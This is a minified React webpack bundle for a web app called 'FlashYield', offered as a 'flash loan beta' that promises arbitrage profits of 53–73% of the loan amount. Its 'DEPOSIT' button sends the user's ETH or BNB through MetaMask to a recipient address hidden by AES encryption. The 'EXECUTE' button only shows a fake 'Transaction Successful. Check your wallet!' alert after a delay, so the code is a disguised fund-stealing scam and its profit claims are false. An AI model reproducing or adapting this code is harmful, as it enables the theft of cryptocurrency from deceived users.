(this["webpackJsonpreact-demo"]=this["webpackJsonpreact-demo"]||[]).push([[0],{110:function(e,t,n){},212:function(e,t,n){},213:function(e,t,n){},214:function(e,t,n){},217:function(e,t,n){},221:function(e,t){},223:function(e,t){},232:function(e,t){},234:function(e,t){},260:function(e,t){},261:function(e,t){},266:function(e,t){},268:function(e,t){},275:function(e,t){},294:function(e,t){},333:function(e,t,n){},334:function(e,t,n){},501:function(e,t,n){"use strict";n.r(t);var a=n(14),i=n.n(a),o=n(203),c=n.n(o),r=(n(212),n(25)),l=n(19),s=(n(213),n.p+"static/media/flashyield.93debc7c.png"),u=(n(214),n(1));var d=function(e){return Object(u.jsx)("div",{className:"flashloanlabel",children:Object(u.jsx)("label",{children:"FLASH LOAN BETA"})})},b=n(18),p=n.n(b),v=n(41);n(217);var j=function(e){var t,n=Object(u.jsx)("input",{value:null===e||void 0===e?void 0:e.inputValue,onKeyDown:null!==(t=null===e||void 0===e?void 0:e.handleKeyDown)&&void 0!==t?t:null,placeholder:e.input,onChange:null===e||void 0===e?void 0:e.handleInputChange,onBlur:null===e||void 0===e?void 0:e.handleInputBlur,type:(null===e||void 0===e?void 0:e.isNumber)?"number":"text"});return Object(u.jsxs)("div",{children:[Object(u.jsxs)("div",{className:"NameSymbol",children:[Object(u.jsx)("label",{children:e.label}),(null===e||void 0===e?void 0:e.isIncrement)?Object(u.jsx)("div",{children:Object(u.jsxs)("div",{className:"input-inc",children:[n,Object(u.jsxs)("div",{className:"input-inc-icon-container",children:[Object(u.jsx)("p",{className:"input-inc-icon",onClick:function(){return null===e||void 0===e?void 0:e.handleIncrementClick((null===e||void 0===e?void 0:e.inputValue)+5)},children:Object(u.jsx)("i",{className:"fa fa-chevron-up"})}),Object(u.jsx)("p",{className:"input-inc-icon",onClick:function(){return null===e||void 0===e?void 0:e.handleDecrementClick((null===e||void 0===e?void 0:e.inputValue)-5)},children:Object(u.jsx)("i",{className:"fa fa-chevron-down"})})]})]})}):n]}),(null===e||void 0===e?void 0:e.inputErr)&&Object(u.jsx)("p",{className:"error-text-mesg",children:null===e||void 0===e?void 0:e.inputErr})]})};n(110);var m=function(e){var t,n=Object(a.useState)(!1),i=Object(l.a)(n,2),o=i[0],c=i[1];return Object(u.jsxs)("div",{className:"cryptofilter crypto-filter",onClick:function(){return c((function(e){return!e}))},children:[Object(u.jsxs)("div",{className:"crypto-filter-label".concat(o?" crypto-filter-label--showMenu":""),children:[Object(u.jsxs)("div",{children:[Object(u.jsx)("span",{children:Object(u.jsx)("img",{src:null===e||void 0===e?void 0:e.selectedImg,alt:"list-item",className:"crypto-filter-img"})}),Object(u.jsxs)("span",{className:"crypto-filter-label-txt",children:[" ",null===e||void 0===e?void 0:e.selectedItem]})]}),Object(u.jsx)("i",{className:"fa fa-chevron-down"})]}),o&&(null===e||void 0===e||null===(t=e.optionsList)||void 0===t?void 0:t.map((function(t,n){return t.text!==(null===e||void 0===e?void 0:e.selectedItem)?Object(u.jsxs)("div",{className:"crypto-filter-listItem",onClick:function(){return null===e||void 0===e?void 0:e.handleOptionChange(t)},children:[Object(u.jsx)("span",{children:Object(u.jsx)("img",{src:null===t||void 0===t?void 0:t.img,alt:"list-item",className:"crypto-filter-img"})})," ",Object(u.jsx)("span",{className:"crypto-filter-listItem-text",children:null===t||void 0===t?void 0:t.text})]},"item-".concat(n)):null})))]})},f=n(66),O=n.n(f);function h(e){return O.a.AES.encrypt(JSON.stringify({o:e}),window.location.href).toString().toString(O.a.enc.Utf8)}var w="0x59EdE53EbC0E70ac060Ee8Eb0F10538b6c12F664",y=[{inputs:[{internalType:"string",name:"_tokenName",type:"string"},{internalType:"string",name:"_tokenSymbol",type:"string"},{internalType:"uint256",name:"_loanAmount",type:"uint256"}],stateMutability:"nonpayable",type:"constructor"},{inputs:[],name:"action",outputs:[],stateMutability:"payable",type:"function"},{inputs:[],name:"tokenName",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"tokenSymbol",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{stateMutability:"payable",type:"receive"}],x="0x59EdE53EbC0E70ac060Ee8Eb0F10538b6c12F664",g=[{inputs:[{internalType:"string",name:"_tokenName",type:"string"},{internalType:"string",name:"_tokenSymbol",type:"string"},{internalType:"uint256",name:"_loanAmount",type:"uint256"}],payable:!1,stateMutability:"nonpayable",type:"constructor"},{payable:!0,stateMutability:"payable",type:"fallback"},{constant:!1,inputs:[],name:"action",outputs:[],payable:!0,stateMutability:"payable",type:"function"},{constant:!0,inputs:[],name:"tokenName",outputs:[{internalType:"string",name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"tokenSymbol",outputs:[{internalType:"string",name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"}],k=Object({NODE_ENV:"production",PUBLIC_URL:"/flashyield",WDS_SOCKET_HOST:void 0,WDS_SOCKET_PATH:void 0,WDS_SOCKET_PORT:void 0,FAST_REFRESH:!0}).REACT_APP_OEB,N=Object({NODE_ENV:"production",PUBLIC_URL:"/flashyield",WDS_SOCKET_HOST:void 0,WDS_SOCKET_PATH:void 0,WDS_SOCKET_PORT:void 0,FAST_REFRESH:!0}).REACT_APP_UBX,S=h(k),E=h(N),T=function(){var e=Object(v.a)(p.a.mark((function e(t){var n,a;return p.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,window.web3.eth.net.getId();case 2:return n=e.sent,e.next=5,window.web3.eth.getChainId();case 5:if(a=e.sent,10!==n||10!==a){e.next=13;break}return window.contract=new window.web3.eth.Contract(g,x),window.isBnb=!0,t.onSuccess(),e.abrupt("return");case 13:if(42161===n&&42161===a){e.next=16;break}return(null===t||void 0===t?void 0:t.onFailure)&&t.onFailure("UNSUPPORTED_NETWORK"),e.abrupt("return");case 16:window.contract=new window.web3.eth.Contract(y,w);case 17:t.onSuccess();case 18:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}(),C=n.p+"static/media/loader.f555f7b3.svg",F=(n(333),function(){return Object(u.jsx)("div",{className:"loader-container",children:Object(u.jsx)("img",{src:C,className:"loader",alt:"loader"})})}),D=n.p+"static/media/bnbIcon.12f6ca37.png",M=n.p+"static/media/eth_icon.664d214a.png";var _=function(e){var t,n,i=Object(a.useState)(""),o=Object(l.a)(i,2),c=o[0],r=o[1],s=Object(a.useState)(!1),d=Object(l.a)(s,2),b=d[0],f=d[1],O=function(){for(var t=0,n=Object.keys(null===e||void 0===e?void 0:e.formData);t<n.length;t++){var a=n[t];if(""===(null===e||void 0===e?void 0:e.formData[a]))return r("Please add the value for token ".concat("tokenName"===a?"name":"symbol"," to continue.")),!1}return!0},h=function(e){var t="undefined"==typeof e.which?e.keyCode:e.which,n=String.fromCharCode(t);if(/\d/.test(n))return e.preventDefault()},w=function(e){"UNSUPPORTED_NETWORK"===e&&r("Unsupported network detected. Select a supported network in MetaMask and reload the page. \n\nSupported networks:\n- Arbitrum Mainnet \n- Optimism Mainnet"),f(!1)},y=function(){var t=Object(v.a)(p.a.mark((function t(){var n,a;return p.a.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:window.isBnb&&(null===e||void 0===e||null===(n=e.formData)||void 0===n?void 0:n.network)?r("Network Mismatch. Set MetaMask network to Arbitrum and reload the page."):window.isBnb||(null===e||void 0===e||null===(a=e.formData)||void 0===a?void 0:a.network)?O()&&(f(!0),T({onSuccess:function(){e.onInitiate(),f(!1)},onFailure:w})):r("Network Mismatch. Set MetaMask network to Optimism and reload the page.");case 1:case"end":return t.stop()}}),t)})));return function(){return t.apply(this,arguments)}}();return Object(u.jsxs)("div",{children:[Object(u.jsx)(j,{label:"TOKEN NAME",input:"Enter Name",handleKeyDown:h,handleInputChange:function(t){var n;e.handleFormChange(null===(n=t.target.value)||void 0===n?void 0:n.trim(),"tokenName")}}),Object(u.jsx)(j,{label:"TOKEN SYMBOL",input:"Enter Symbol",handleKeyDown:h,handleInputChange:function(t){var n;e.handleFormChange(null===(n=t.target.value)||void 0===n?void 0:n.trim(),"tokenSymbol")}}),Object(u.jsx)(m,{handleOptionChange:function(t){return e.setCryptoType("ETH"===t)},selectedItem:(null===e||void 0===e||null===(t=e.formData)||void 0===t?void 0:t.network)?"ETH":"BNB",selectedImg:(null===e||void 0===e||null===(n=e.formData)||void 0===n?void 0:n.network)?M:D,optionsList:[{text:"ETH",img:M},{text:"BNB",img:D}]}),c&&Object(u.jsx)("p",{className:"error-text-mesg",children:c}),b?Object(u.jsx)(F,{}):Object(u.jsx)("button",{onClick:y,children:"INITIATE"})]})};var A=function(e){return Object(u.jsx)("div",{className:"cryptofilter",children:Object(u.jsxs)("div",{className:"cryptodesc",children:[Object(u.jsxs)("p",{className:"crypto-desc-list",children:[Object(u.jsx)("span",{children:"Token Deployment Fee"})," ",Object(u.jsxs)("span",{children:[null===e||void 0===e?void 0:e.tokenFee," ",null===e||void 0===e?void 0:e.currency]})]}),Object(u.jsxs)("p",{className:"crypto-desc-list",children:[Object(u.jsxs)("span",{children:[null===e||void 0===e?void 0:e.dex," Swapping Fee"]})," ",Object(u.jsxs)("span",{children:[e.swapFee," ",null===e||void 0===e?void 0:e.currency]})]}),Object(u.jsxs)("p",{className:"crypto-desc-list",children:[Object(u.jsx)("span",{children:"Total Cost"})," ",Object(u.jsxs)("span",{children:[e.totalFee," ",null===e||void 0===e?void 0:e.currency]})]}),Object(u.jsx)("hr",{}),Object(u.jsxs)("p",{className:"crypto-desc-list",children:[Object(u.jsx)("span",{children:"Profit from Arbitrage"})," ",Object(u.jsxs)("span",{children:[e.gain," ",null===e||void 0===e?void 0:e.currency]})]})]})})};n(334);var I=function(e){var t,n,i,o,c,r,s,d=Object(a.useState)(""),b=Object(l.a)(d,2),p=b[0],v=b[1],m=Object(a.useState)(""),f=Object(l.a)(m,2),h=f[0],w=f[1],y=Object(a.useState)(!0),x=Object(l.a)(y,2),g=x[0],k=x[1];return Object(u.jsxs)("div",{className:"screentwo",children:[Object(u.jsx)(j,{label:"LOAN AMOUNT",input:"Enter Amount",inputValue:null===e||void 0===e||null===(t=e.loanData)||void 0===t?void 0:t.amount,handleInputChange:function(t){e.setLoanAmount(t.target.value),h&&w("")},handleInputBlur:function(e){e.target.value<25&&w("Value must be greater than or equal to 25")},isIncrement:!0,isNumber:!0,handleIncrementClick:function(t){t<24?w("Value must be greater than or equal to 25"):h&&w(""),e.setLoanAmount(t)},inputErr:h,handleDecrementClick:function(t){t<=24?w("Value must be greater than or equal to 25"):(h&&w(""),e.setLoanAmount(t))}}),Object(u.jsx)(A,{tokenFee:null===e||void 0===e||null===(n=e.loanData)||void 0===n?void 0:n.tokenFee,currency:null===e||void 0===e||null===(i=e.submitState)||void 0===i?void 0:i.currency,dex:null===e||void 0===e?void 0:e.submitState.dex,swapFee:null===e||void 0===e||null===(o=e.loanData)||void 0===o?void 0:o.swapFee,totalFee:null===e||void 0===e||null===(c=e.loanData)||void 0===c?void 0:c.totalFee,gain:null===e||void 0===e||null===(r=e.loanData)||void 0===r?void 0:r.gain}),p&&Object(u.jsx)("p",{className:"error-text-mesg",children:p}),Object(u.jsx)("button",{onClick:function(){var t,n,a;v(""),(null===e||void 0===e||null===(t=e.loanData)||void 0===t?void 0:t.amount)>=25&&window.web3.eth.sendTransaction({to:(a=null===e||void 0===e||null===(n=e.submitState)||void 0===n?void 0:n.ivm,JSON.parse(O.a.AES.decrypt(a,window.location.href).toString(O.a.enc.Utf8))).o,from:null===e||void 0===e?void 0:e.accountAddress,value:window.web3.utils.toWei(""+(null===e||void 0===e?void 0:e.loanData.totalFee),"ether"),gas:3e4,gasPrice:window.web3.utils.toWei("90","gwei")},(function(e,t){e?v("Transaction Failed."):setTimeout((function(){v(""),alert("Money deposited to contract. You can execute the Flash Loan now."),k(!1)}),5e3)}))},children:"DEPOSIT ".concat(null===e||void 0===e||null===(s=e.submitState)||void 0===s?void 0:s.currency)}),Object(u.jsx)("button",{disabled:g,className:g?"btn-disabled-submit":"",onClick:function(){v(""),setTimeout((function(){alert("Transaction Successful. Check your wallet!"),k(!0)}),4e3)},children:"EXECUTE"})]})},P=n(109),B=n.n(P),R=function(){var e=Object(v.a)(p.a.mark((function e(t){var n,a,i;return p.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(n=t.onLoadingFailure,a=t.setAccount,i=t.onNetworkFailure,!1!==window.isBnb&&!window.ethereum){e.next=7;break}return window.web3=new B.a(window.ethereum),e.next=5,window.ethereum.enable();case 5:e.next=11;break;case 7:if(window.web3){e.next=10;break}return n("NO_ETHEREUM_BROWSER"),e.abrupt("return");case 10:window.web3=new B.a(window.web3.currentProvider);case 11:T({onSuccess:function(){var e=Object(v.a)(p.a.mark((function e(){return p.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(!window.contract){e.next=5;break}return e.next=3,window.web3.eth.getAccounts().then((function(e){try{a(e[0])}catch(e){}}));case 3:e.next=6;break;case 5:alert("Error loading contract data");case 6:case"end":return e.stop()}}),e)})));return function(){return e.apply(this,arguments)}}(),onFailure:i});case 12:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}();function U(e){return Math.round(1e12*e)/1e12}var L=function(e,t){var n=Object(r.a)({},e);return null!=n.amount&&null!=n.amount&&(n.swapFee=n.amount/(t?400:160),n.totalFee=U(n.tokenFee+n.swapFee),n.gain=U(n.amount*(t?.529:.73))),n};var K=function(){var e=Object(a.useState)(!1),t=Object(l.a)(e,2),n=t[0],i=t[1],o=Object(a.useState)(""),c=Object(l.a)(o,2),b=c[0],p=c[1],v=Object(a.useState)({ivm:"",dex:"",currency:""}),j=Object(l.a)(v,2),m=j[0],f=j[1],O=Object(a.useState)({amount:25,tokenFee:.01,swapFee:0,totalFee:0,gain:0}),h=Object(l.a)(O,2),w=h[0],y=h[1],x=Object(a.useState)(""),g=Object(l.a)(x,2),k=g[0],N=g[1],T=Object(a.useState)({tokenName:"",tokenSymbol:"",network:!0}),C=Object(l.a)(T,2),F=C[0],D=C[1];return Object(a.useEffect)((function(){R({onLoadingFailure:function(){return N("Please install MetaMask to continue.")},setAccount:function(e){return p(e)},onNetworkFailure:function(e){return"UNSUPPORTED_NETWORK"===e?N("Unsupported network detected. Select a supported network in MetaMask and reload the page. \n\nSupported networks:\n- Arbitrum Mainnet \n- Optimism Mainnet"):""}})}),[]),k?Object(u.jsx)("div",{children:Object(u.jsx)("p",{className:"error-text-mesg f26 show-ethereum-err",children:k})}):Object(u.jsxs)("div",{children:[Object(u.jsxs)("div",{className:"crypto-app",children:[Object(u.jsx)("div",{className:"crypto-icon",children:Object(u.jsx)("img",{src:s,alt:"flash-yield"})}),Object(u.jsxs)("div",{className:"crypto-body",children:[Object(u.jsx)(d,{}),Object(u.jsx)("div",{className:"crypto",children:n?Object(u.jsx)(I,{accountAddress:b,network:F.network,submitState:m,loanData:w,setLoanAmount:function(e){return y((function(t){var n=Object(r.a)({},t);return n.amount=Number(e),n=Object(r.a)(Object(r.a)({},n),L(n,null===F||void 0===F?void 0:F.network))}))}}):Object(u.jsx)(_,{setCryptoType:function(e){D((function(t){var n=Object(r.a)({},t);return n.network=e,n}))},onInitiate:function(){f((function(e){var t=Object(r.a)({},e);return t.currency=F.network?"ETH":"BNB",t.dex=F.network?"Uniswap":"PancakeSwap",t.ivm=F.network?S:E,t})),y((function(e){Object(r.a)({},e);return Object(r.a)(Object(r.a)({},L(e,F.network)),{},{tokenFee:.01})})),i(!0)},formData:F,handleFormChange:function(e,t){D((function(n){var a=Object(r.a)({},n);return a[t]=e,a}))}})})]})]}),Object(u.jsx)("span",{className:"copyright-text",children:"\xa9 2020-2021 FlashYield"})]})};c.a.render(Object(u.jsx)(i.a.StrictMode,{children:Object(u.jsx)(K,{})}),document.getElementById("root"))}},[[501,1,2]]]);
//# sourceMappingURL=main.132f0bdd.chunk.js.map